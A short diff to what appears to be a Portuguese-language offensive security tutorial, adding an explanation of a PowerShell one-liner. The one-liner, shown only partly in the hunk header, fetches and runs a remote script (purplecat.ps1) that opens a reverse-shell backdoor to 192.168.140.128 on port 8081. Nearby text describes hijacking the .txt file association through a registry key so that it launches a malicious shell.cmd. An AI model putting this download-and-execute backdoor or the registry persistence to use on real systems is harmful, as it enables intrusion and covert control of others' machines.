@@ -59,6 +59,12 @@ powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('h
 
 
 ```
+Este comando do PowerShell baixa um script remoto chamado purplecat.ps1de um local específico e, em seguida, usa esse script para estabelecer uma conexão "backdoor" com uma máquina remota no endereço IP 192.168.140.128na porta 8081, permitindo que comandos sejam executados cmd.exenessa máquina.
+
+
+
+
+
 
 A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.
 
